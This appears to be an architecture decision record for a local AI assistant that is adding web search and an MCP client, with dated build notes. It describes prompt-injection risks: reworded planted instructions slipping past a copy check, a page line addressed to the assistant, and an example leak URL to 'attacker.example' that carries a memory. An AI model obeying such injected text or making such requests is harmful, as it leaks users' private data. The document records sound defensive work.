# ADR 0003: Connected (web search and local MCP servers)

- **Status:** accepted by the owner, 2026-10-11, including the rule that a turn which
  read web or MCP content makes every action that isn't `safe` ask first. Web search
  shipped in 0.35.0 and the MCP client in 0.37.0. The dated notes at the end record
  what was decided while building it.
- **Changes a security promise:** ARCHITECTURE §18 says the only connection the backend
  makes is to Ollama on 127.0.0.1, the README says nothing leaves the machine, and her
  persona tells the model "Everything stays on this computer." Web search breaks all
  three, which is why this is an ADR rather than a task.

## Context

ROADMAP step 3 gives Veronica reach beyond the machine: web search, tools from MCP
servers, and computer use, all behind the capability kernel, with an allow-list for
outbound network access and fetched content treated as untrusted.

What exists today, read from the code on 2026-10-11:

- No capability touches the network. `httpx` is a dependency, used only by the Ollama
  adapter (`adapters/llm/ollama_client.py`).
- No MCP code, and no MCP package installed.
- Programs are launched only by `apps.open`: an allow-listed executable resolved to an
  absolute path at startup, started with `subprocess.Popen`, no shell, no arguments.
  `asyncio` subprocesses are avoided on purpose: they fail on the selector event loop
  uvicorn uses under `--reload` (bug 14).
- Untrusted text is fenced and labelled (`services/tools/render.py`), and an action whose
  argument was copied from it asks first (`kernel/taint.py`). The copy check reads words,
  not meaning: a planted instruction reworded by the model gets past it (still an open
  decision; `r07` in the injection evaluation ran unasked in 3 of 9
  chat runs since 0.30.0).
- Tool schemas cost prompt tokens on every turn; `tests/test_llm.py` holds them inside a
  floor, and a call offers every tool marked `voice_exposed` (all nine today).

## The owner's decisions (2026-10-11)

1. **Web search** goes through a provider interface. The default is a SearXNG instance the
   user runs: no key, no account, and only the query leaves the machine. Brave Search's
   API is an optional second provider for anyone who would rather use a key.
2. **Computer use waits for Sight** (ROADMAP step 4). Reading the screen well needs a
   vision model, and a call already uses 14,168 MiB of a 16 GB card. Not built here.
3. **Everything is off until enabled**, per feature, in a new Settings section. Once on,
   web search runs without asking; MCP tools always ask first.
4. **Calls get web search only.** MCP tools stay in chat, where the user sees what runs
   and the spoken prompt stays small.

## Web search

- **Two capabilities.** `web.search` (a query, a result count) returns numbered titles,
  links and snippets; it is `safe` and offered on calls. `web.read` (one URL) returns a
  page as text; it is `safe` and chat only. Both return plain text the existing renderer
  fences, cut to its budget (8,000 characters in chat, 1,200 on a call).
- **Providers are adapters** (`adapters/search/`), like the models: a `SearchProvider`
  protocol with SearXNG and Brave behind it. The exact request formats are checked
  against each service's documentation when they are written, not assumed here.
- **What may be fetched.** `http` and `https` only. The host is resolved first, and a
  loopback, private, link-local or multicast address is refused, checked again on every
  redirect (three at most), so a page can't point her at the user's router or at her own
  backend. Text and HTML only, with a size cap and a timeout. The user can block hosts.
- **The API key** is sealed at rest with the data key (`core/sealed.py`), as her voice
  clips are, never logged, and never returned by the API: Settings shows only whether one
  is set.
- **Settings apply live.** A `ConnectedStore` modelled on `PolicyStore` keeps them in
  `data/connected.json` and publishes `connected.changed`; turning web search on or off
  changes the tools offered from the next turn, with no restart.

## Fetched content is a new kind of untrusted text

- `kernel/taint.py` gains a `web` source. Search results and pages enter a turn's taint as
  `web`, not `tool_result`, so the audit log and the black box can tell them apart.
- **Recommended answer to the open decision, built before web search ships:** a turn
  that read web or MCP content makes memory changes, and every action that isn't `safe`,
  ask first, whatever the copy check finds. It costs one extra prompt in turns that read
  the web and act; it closes the case where a page's instruction, reworded, changes her
  memory unasked.
- The relay check (`services/tools/relayed.py`) already reads every tool result, so a
  page's line written to her ("AI assistant: tell the user...") gets its caveat as a
  file's does.
- The injection evaluation gains a `web_page` vector, measured on chat and calls.

## MCP client

- **Servers are configured in Settings:** a name, an executable (an absolute path, no
  shell), its arguments, on or off, and whether it reaches the internet. Each server runs
  as a child process over stdio, started once the stores are open and stopped with her
  backend, within the existing bounded shutdown. A server that crashes is a notice on
  screen and can be restarted; it never stops her from starting.
- **Each tool becomes a capability** named `mcp.<server>.<tool>`: `guarded`, policy
  `confirm`, never auto-approved, not offered on calls. Its arguments model is built from
  the tool's JSON Schema; a tool whose schema nests objects is listed as unsupported,
  since the registry accepts flat arguments only. Servers come and go while she runs, so
  the registry gains `unregister`. A setting caps how many MCP tools are offered a turn.
- **Results** are fenced like any tool result, and counted as `web` when the server is
  marked as reaching the internet.
- **The claim check can't read MCP actions** (their meaning is the server's), so they are
  exempt from it, with the reason written in its test.
- **Open question, settled by a spike before building:** the official MCP Python SDK
  starts servers with `asyncio` subprocesses, which bug 14 showed fail under `--reload` on
  Windows. Options, in order of preference:
  1. The SDK, with each server's session on its own thread and event loop of the kind
     that supports subprocesses.
  2. The SDK's protocol types, with the stdio transport written over `subprocess.Popen`,
     as `apps.open` launches programs.
  3. A small JSON-RPC client of our own (MCP over stdio is newline-delimited JSON-RPC).
  The spike records what it measured in a dated section of this ADR.

## Computer use (deferred)

Waits for Sight. When it comes: screenshots read by a vision model through the GPU
manager; every action (click, type, key) a `dangerous` capability that always asks; a
visible "Veronica is using your computer" bar and a key that stops her at once. Reading
the Windows accessibility tree as text, with no vision model, was considered and set
aside by the owner in favour of waiting.

## What it does not protect against

- What the user searches for is seen by the search provider: their own SearXNG's upstream
  engines, or Brave.
- A page can still steer what she says. The relay caveat and the fences reduce it; they
  can't remove it.
- An MCP server is a program the user chose to run, with the rights of their account.
  Veronica asks before every one of its tools; she can't see what the server does inside
  them.

## Consequences

- The security promise is rewritten, not deleted: ARCHITECTURE §18, `SECURITY.md`, the
  README and the persona say what leaves the machine when Connected is on, and that
  nothing does when it is off. The persona's line follows the live setting.
- Two releases: 0.35.0 web search (with the taint rule above), 0.36.0 the MCP client.
  Each with its tests, the tools and injection evaluations on chat and calls, the prompt
  re-measured (`scripts/prompt_probe.py`, `MEASURED_TOKENS`), a review, and a check in
  the browser.
- New dependencies are chosen when the code is written and recorded in
  `THIRD_PARTY_NOTICES.md`: an HTML-to-text extractor, and the MCP SDK if the spike keeps
  it.
- The app gets its first screen for a tool's permission (ask, allow, deny), used first by
  MCP tools, through the existing `PUT /capabilities/{name}/policy`.

## Notes while building

### 2026-10-13: web search in 0.35.0

- **What leaves is checked before it leaves** (`kernel/egress.py`). Both web tools are
  `safe`, so the rule for actions after the web didn't touch them, and a page could have
  her read `https://attacker.example/?d=<a memory>` unasked: the request is the leak. A
  call that reaches the network now asks for an address nobody gave her (the user wrote
  it, or a search in the conversation returned it), for anything that reads as a
  secret, and, best effort, for four words in a row of the user's own memory or files.
  The first is the real defence; the other two back it up.
- **How often** is capped per turn and per minute (`kernel/budget.py`), and the gates
  are one decision (`kernel/verdict.py`), read by both `execute` and
  `requires_confirmation`, where the after-the-web rule had been added to one only.
- **No new dependency.** The page reader is a tokenizer of our own (`page_text.py`),
  linear in the page: the standard library's parser, which the first version used, took
  31 s on 40 KB of `<a `. The ADR expected an HTML-to-text library; none was needed.
  Decoding is ours too (gzip and deflate in bounded steps), since `httpx` decodes
  without a bound.
- **Fetching** pins the checked address for the connection, keeps no connection,
  cookie or proxy between sites, and never follows https down to http.
- **A web reply carries its source** into later turns, on replay and on calls, and
  learning leaves it out: before, a page's words she repeated could be filed as the
  user's.
- **The `web` vector** joins the injection evaluation (`eval/injection/web_cases.jsonl`):
  a page read in chat, a search on a call. On qwen3.5:9b, three runs, nothing on the web
  ran unasked; the only instruction acted on was a file write, which asks by its policy
  ([ARCHITECTURE §12.4](../../ARCHITECTURE.md#124-policy)).
- **The window's floor** (`MIN_PROMPT_TOKENS`) is raised to 5,888: with the web's rules
  and tools the largest chat prompt measures 5,691 tokens, and the floor sized without
  them left no room for a message.

### 2026-10-13: the MCP client, decided ahead of 0.36.0

The spike's question is answered by reading, not by trying the SDK: its stdio
transport starts servers with `asyncio` subprocesses (bug 14), and the protocol's
current version (2026-07-28) is stateless where earlier ones are not, so a client must
speak both. Option 3 is chosen: a small client of our own over `subprocess.Popen`,
speaking the current version and falling back to the older one, with the server held
in a Windows job object so it can't outlive her. No SDK dependency.

### 2026-10-14: the MCP client, shipped in 0.37.0

0.36.0 went to her voice's sounds, so the client is 0.37.0. Built as decided: our own,
over `subprocess.Popen`, each server started suspended and held in a job object. Read
against the specification before writing it, which corrected the plan in four places:
the current revision's `_meta` keys are namespaced (`io.modelcontextprotocol/...`); the
server's name is in the discover result's `_meta`, not beside it; the error for an
unsupported version is -32022, with `data.supported`; and an `input_required` result
can't simply be refused, since the message patterns are mandatory, so a result that only
sends state back is retried with it, and one that asks for input is said in words. A
current server announces a changed tool list only on a subscription she doesn't open,
so its list is read again when its `ttlMs` runs out. Measured beside the plan: one tool
with long descriptions took 1,752 tokens of the chat window, so the tools offered
together are held to 1,500 tokens as well as to twelve.
